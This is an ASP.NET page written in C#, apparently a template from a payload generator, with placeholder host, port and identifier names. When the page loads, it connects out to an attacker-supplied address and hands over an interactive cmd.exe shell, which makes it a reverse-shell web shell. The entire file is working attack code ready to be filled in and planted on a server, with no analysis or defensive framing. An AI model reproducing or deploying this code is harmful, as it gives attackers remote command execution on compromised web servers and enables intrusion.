<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string #IP# = "#LHOST#";
    int #PORT# = #LPORT#;
    using (TcpClient #C# = new TcpClient(#IP#, #PORT#)) {
        using (Stream #S# = #C#.GetStream()) {
            using (StreamReader #R# = new StreamReader(#S#)) {
                using (StreamWriter #W# = new StreamWriter(#S#)) {
                    #W#.AutoFlush = true;
                    Process #P# = new Process();
                    #P#.StartInfo.FileName = "cmd.exe";
                    #P#.StartInfo.CreateNoWindow = true;
                    #P#.StartInfo.UseShellExecute = false;
                    #P#.StartInfo.RedirectStandardOutput = true;
                    #P#.StartInfo.RedirectStandardInput = true;
                    #P#.StartInfo.RedirectStandardError = true;
                    #P#.Start();
                    #P#.BeginOutputReadLine();
                    #P#.BeginErrorReadLine();
                    #P#.OutputDataReceived += (s, ev) => { if (ev.Data != null) #W#.WriteLine(ev.Data); };
                    #P#.ErrorDataReceived += (s, ev) => { if (ev.Data != null) #W#.WriteLine(ev.Data); };
                    while (!#C#.Connected || !#P#.HasExited) {
                        string #IN# = #R#.ReadLine();
                        if (#IN# == null) break;
                        #P#.StandardInput.WriteLine(#IN#);
                    }
                }
            }
        }
    }
}
</script>
